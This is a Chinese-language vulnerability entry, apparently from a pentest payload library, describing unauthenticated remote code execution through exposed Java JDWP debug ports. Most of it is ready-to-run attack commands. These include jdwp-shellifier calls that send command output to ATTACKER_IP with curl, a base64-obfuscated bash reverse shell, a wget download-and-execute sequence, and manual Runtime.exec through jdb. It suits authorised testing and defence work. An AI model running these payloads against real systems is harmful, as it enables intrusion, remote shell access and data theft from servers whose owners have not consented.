---
id: JDWP-RCE
title: JDWP 调试接口远程代码执行漏洞
product: java
vendor: Oracle
version_affected: "all versions (misconfiguration)"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["JDWP-Handshake"]
---

## 漏洞描述

Java Debug Wire Protocol (JDWP) 是 Java 调试协议，当 Java 应用以 debug 模式运行且 JDWP 端口对外暴露时，攻击者无需认证即可连接调试接口，通过设置断点获取线程上下文，调用 `Runtime.exec()` 执行任意系统命令，实现远程代码执行。

## 影响版本

- 所有开启 JDWP 调试且端口对外暴露的 Java 应用

## 前置条件

- 无需认证
- 目标 JDWP 调试端口对外可访问（常见端口：8000, 8787, 5005）
- Java 应用以 debug 模式运行

## 利用步骤

1. 探测目标端口是否为 JDWP 服务（发送 JDWP-Handshake 握手）
2. 使用 jdwp-shellifier 工具连接 JDWP 端口
3. 通过断点或 Sleeping 线程获取执行上下文
4. 调用 Runtime.exec() 执行系统命令

## Payload

### JDWP 服务探测

```bash
# 使用 nmap 探测
nmap -sT -sV target -p 8000,8787,5005

# 使用 Python 探测
python3 -c "
import socket
s = socket.socket()
s.settimeout(5)
s.connect(('target', 8000))
s.send(b'JDWP-Handshake')
resp = s.recv(1024)
if resp == b'JDWP-Handshake':
    print('[+] JDWP service detected!')
else:
    print('[-] Not JDWP')
s.close()
"
```

### 使用 jdwp-shellifier 执行命令

```bash
# 工具地址: https://github.com/IOActive/jdwp-shellifier (Python2)
# 改进版（Sleeping线程，无需等待断点触发）: https://github.com/Lz1y/jdwp-shellifier

# DNSLog 验证
python2 jdwp-shellifier.py -t target -p 8000 \
  --break-on "java.lang.String.indexOf" \
  --cmd "ping YOUR_DNSLOG_DOMAIN"

# 执行 id 命令（无回显，需配合回调）
python2 jdwp-shellifier.py -t target -p 8000 \
  --break-on "java.lang.String.indexOf" \
  --cmd "curl http://ATTACKER_IP:8080/$(id|base64)"

# 反弹 shell — 方法一：直接 bash 反弹
python2 jdwp-shellifier.py -t target -p 8000 \
  --break-on "java.lang.String.indexOf" \
  --cmd "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}"

# 反弹 shell — 方法二：下载并执行
python2 jdwp-shellifier.py -t target -p 8000 \
  --break-on "java.lang.String.indexOf" \
  --cmd "wget http://ATTACKER_IP:8080/shell.sh -O /tmp/shell.sh"

python2 jdwp-shellifier.py -t target -p 8000 \
  --break-on "java.lang.String.indexOf" \
  --cmd "chmod +x /tmp/shell.sh"

python2 jdwp-shellifier.py -t target -p 8000 \
  --break-on "java.lang.String.indexOf" \
  --cmd "/tmp/shell.sh"
```

### 改进版（无需等待断点）

```bash
# Lz1y 改进版通过向 Sleeping 线程发送单步执行事件直接获取上下文
python2 jdwp-shellifier.py -t target -p 8000 \
  --cmd "curl http://ATTACKER_IP:8080/pwned"
```

### 使用 JDB 手动利用

```bash
# 连接 JDWP
jdb -connect sun.jdi.SocketAttach:hostname=target,port=8000

# 在 jdb 中执行
> threads
> thread <thread-id>
> print new java.lang.Runtime().exec("id")
```

## 验证方法

```bash
# 1. 确认 JDWP 服务
python3 -c "
import socket
s = socket.socket(); s.settimeout(5)
s.connect(('target', 8000))
s.send(b'JDWP-Handshake')
print('JDWP!' if s.recv(1024) == b'JDWP-Handshake' else 'No')
s.close()
"

# 2. 命令执行验证 — HTTP 回调
# 攻击机: nc -lvp 8080
python2 jdwp-shellifier.py -t target -p 8000 \
  --break-on "java.lang.String.indexOf" \
  --cmd "curl http://ATTACKER_IP:8080/jdwp-rce"
# 检查 listener 是否收到请求
```

## 指纹确认

```bash
nmap -sT -sV target -p 8000 2>/dev/null | grep -i "jdwp\|Java Debug"
```

## 参考链接

- https://github.com/IOActive/jdwp-shellifier
- https://github.com/Lz1y/jdwp-shellifier
- https://forum.butian.net/share/1232
